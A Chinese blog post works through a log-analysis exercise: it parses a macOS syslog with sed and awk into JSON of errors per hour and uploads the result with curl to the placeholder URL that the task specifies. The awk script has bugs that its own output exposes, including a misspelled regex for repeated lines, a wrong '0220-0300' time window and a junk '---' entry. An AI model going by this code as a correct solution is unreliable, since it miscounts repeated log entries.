0 501<br>May 13 00:21:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12560]): Service exited with abnormal code: 78<br>May 13 00:22:18 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.user.914945058): Service “com.apple.xpc.launchd.unmanaged.loginwindow.594” tried to register for endpoint “com.apple.tsm.uiserver” already registered by owner: com.apple.TextInputMenuAgent<br>May 13 00:22:49 — last message repeated 1 time —<br>May 13 00:23:50 BBAOMACBOOKAIR2 timed[158]: settimeofday({0x5ebacd96,0x52ddf}) &#x3D;&#x3D; 0<br>May 13 00:28:05 BBAOMACBOOKAIR2 syslogd[113]: ASL Sender Statistics<br>May 13 00:28:07 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.ScreenSaver.Computer-Name[12564]): Service exited due to SIGKILL | sent by Computer Name[12564]<br>May 13 00:28:17 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:17 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:18 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:18 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:19 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:19 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:20 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:20 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debug<br>May 13 00:28:26 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.preference.displays.MirrorDisplays): Service only ran for 9 seconds. Pushing respawn out by 1 seconds.<br>May 13 00:28:31 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.preference.displays.MirrorDisplays): Service only ran for 4 seconds. Pushing respawn out by 6 seconds.<br>May 13 00:29:49 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12610]): Could not find uid associated with service: 0: Undefined error: 0 501<br>May 13 00:29:49 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12610]): Service exited with abnormal code: 78<br>May 13 00:30:00 BBAOMACBOOKAIR2 syslogd[113]: Configuration Notice:<br>    ASL Module “com.apple.cdscheduler” claims selected messages.<br>    Those messages may not appear in standard system log files or in the ASL database.<br>May 13 00:30:00 BBAOMACBOOKAIR2 syslogd[113]: Configuration Notice:<br>    ASL Module “com.apple.install” claims selected messages.<br>    Those messages may not appear in standard system log files or in the ASL database.<br>May 13 00:30:00 BBAOMACBOOKAIR2 syslogd[113]: Configuration Notice:<br>    ASL Module “com.apple.callhistory.asl.conf” claims selected messages.</p>
</blockquote>
<span id="more"></span>

<p>以上日志贴出来可能看的不够清晰，其实就几点：</p>
<ol>
<li>正常的日志都是日期时间开头，像“May 13 00:30:00”这样</li>
<li>不是这个开头的日志行（基本都是 \t 跳格开头），其实是上一行的继续（日志分析时要将其和上一行合并）</li>
<li>有“— last message repeated 1 time —”的日志其实内容跟上一行是完全一样的（开头的日期时间除外）</li>
</ol>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>分析系统日志文件（data.gz）从中得到关键信息，用 Json 的格式 POST 上传至服务器 <a href="https://foo.com/bar">https://foo.com/bar</a> )，key的名称如下（在括号里）：</p>
<ol>
<li>设备名称: (deviceName)</li>
<li>错误的进程号码: (processId)</li>
<li>进程&#x2F;服务名称: (processName)</li>
<li>错误的原因（描述）(description)</li>
<li>发生的时间（小时级），例如0100-0200，0300-0400, (timeWindow)</li>
<li>在小时级别内发生的次数 (numberOfOccurrence)</li>
</ol>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里考察的点应该就是多行日志的处理（主要是合并）问题，这个可以借助 sed 可以搞定，但还有一个重复日志的问题，也就是当日志行里有“— last message repeated 1 time —”时的处理问题，没想好怎样完美的解决。</p>
<h2 id="最终方案代码"><a href="#最终方案代码" class="headerlink" title="最终方案代码"></a>最终方案代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzcat data.gz | <span class="built_in">head</span> -n 40 | sed -e <span class="string">&#x27;1h;2,$H;$!d;g;s/\n\t/ /g&#x27;</span> | awk -f log_ana.awk&gt; data.json</span><br><span class="line"><span class="comment"># 上面的 head -n 40 主要是为了演示，只取头 40 行数据，真正的环境是取的整个数据文件的所有数据</span></span><br><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d @data.json https://foo.com/bar</span><br></pre></td></tr></table></figure>

<p>其中 log_ana.awk 代码如下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/awk -f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> &#123;</span><br><span class="line">    pre_logline = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    processId = <span class="number">0</span></span><br><span class="line">    deviceName = <span class="string">&quot;&quot;</span></span><br><span class="line">    processName = <span class="string">&quot;&quot;</span></span><br><span class="line">    description = <span class="string">&quot;&quot;</span></span><br><span class="line">    timeWindow = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">/--- last message peated 1 time ---/</span> &#123;</span><br><span class="line">    sub(<span class="regexp">/--- last message peated 1 time ---/</span>, pre_logline)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> a</span><br><span class="line">    split(<span class="variable">$3</span>, a, <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;00&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0000-0100&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;01&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0100-0200&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;02&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0220-0300&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;03&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0300-0400&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;04&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0400-0500&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;05&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0500-0600&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;06&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0600-0700&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;07&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0700-0800&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;08&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0800-0900&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;09&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;0900-1000&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;10&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1000-1100&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;11&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1100-1200&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;12&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1200-1300&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;13&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1300-1400&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;14&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1400-1500&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;15&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1500-1600&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;16&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1600-1700&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;17&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1700-1800&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;18&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1800-1900&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;19&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;1900-2000&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;20&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;2000-2100&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;21&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;2100-2200&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;22&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;2200-2300&quot;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a[<span class="number">1</span>] == <span class="string">&quot;23&quot;</span>)</span><br><span class="line">        timeWindow = <span class="string">&quot;2300-2400&quot;</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">4</span>; i&lt;=NF; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">4</span>) &#123;</span><br><span class="line">            pre_logline = <span class="variable">$i</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pre_logline = pre_logline<span class="string">&quot; &quot;</span><span class="variable">$i</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((pre_logline, timeWindow) <span class="keyword">in</span> countA) &#123;</span><br><span class="line">        countA[pre_logline, timeWindow] = countA[pre_logline, timeWindow] + <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        countA[pre_logline, timeWindow] = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span> &#123;</span><br><span class="line">    print <span class="string">&quot;[&quot;</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (k <span class="keyword">in</span> countA) &#123;</span><br><span class="line">        processId = <span class="number">0</span></span><br><span class="line">        deviceName = <span class="string">&quot;&quot;</span></span><br><span class="line">        processName = <span class="string">&quot;&quot;</span></span><br><span class="line">        description = <span class="string">&quot;&quot;</span></span><br><span class="line">        timeWindow = <span class="string">&quot;&quot;</span></span><br><span class="line">        c = length(countA)</span><br><span class="line">        <span class="keyword">delete</span> a</span><br><span class="line">        split(k, a, SUBSEP)</span><br><span class="line">	numberOfOccurrence = countA[a[<span class="number">1</span>], a[<span class="number">2</span>]]</span><br><span class="line">        timeWindow = a[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">delete</span> aa</span><br><span class="line">        split(a[<span class="number">1</span>], aa, <span class="string">&quot; &quot;</span>)</span><br><span class="line">        deviceName = aa[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">delete</span> aaa</span><br><span class="line">        split(aa[<span class="number">2</span>], aaa, <span class="string">&quot;]&quot;</span>)</span><br><span class="line">        <span class="keyword">delete</span> aaaa</span><br><span class="line">        split(aaa[<span class="number">1</span>], aaaa, <span class="string">&quot;[&quot;</span>)</span><br><span class="line">        processName = aaaa[<span class="number">1</span>]</span><br><span class="line">        processId = aaaa[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">3</span>; i&lt;=length(aa); i++) &#123;</span><br><span class="line">            gsub(<span class="regexp">/&quot;/</span>, <span class="string">&quot;\\\&quot;&quot;</span>, aa[i])</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">                description = aa[i]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                description = description<span class="string">&quot; &quot;</span>aa[i]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    	printf <span class="string">&quot;  &#123;\n    \&quot;deviceName\&quot;:\&quot;%s\&quot;, \n    \&quot;processId\&quot;:%d, \n    \&quot;processName\&quot;:\&quot;%s\&quot;, \n    \&quot;description\&quot;:\&quot;%s\&quot;, \n    \&quot;timeWindow\&quot;:\&quot;%s\&quot;, \n    \&quot;numberOfOccurrence\&quot;:%d \n  &#125;&quot;</span>, deviceName, processId, processName, description, timeWindow, numberOfOccurrence</span><br><span class="line">        sum = sum + numberOfOccurrence</span><br><span class="line">        <span class="keyword">if</span> (n &lt; c)</span><br><span class="line">            print <span class="string">&quot;, &quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            print <span class="string">&quot;&quot;</span></span><br><span class="line">        n++</span><br><span class="line">    &#125;</span><br><span class="line">    print <span class="string">&quot;]&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>data.json 文件的内容可以这样看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> data.json</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12560]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12535]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;---&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;last&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;message repeated 1 time ---&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12513]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.preference.displays.MirrorDisplays): Service only ran for 9 seconds. Pushing respawn out by 1 seconds.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">158</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;timed&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;settimeofday(&#123;0x5ebacd96,0x52ddf&#125;) == 0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.xpc.launchd.domain.user.914945058): Service \&quot;com.apple.xpc.launchd.unmanaged.loginwindow.594\&quot; tried to register for endpoint \&quot;com.apple.tsm.uiserver\&quot; already registered by owner: com.apple.TextInputMenuAgent&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;syslogd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;Configuration Notice: ASL Module \&quot;com.apple.install\&quot; claims selected messages. Those messages may not appear in standard system log files or in the ASL database.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12610]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12610]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.preference.displays.MirrorDisplays): Service only ran for 4 seconds. Pushing respawn out by 6 seconds.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12535]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.xpc.launchd.domain.pid.mdmclient.12523): Failed to bootstrap path: path = /usr/libexec/mdmclient, error = 108: Invalid path&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span 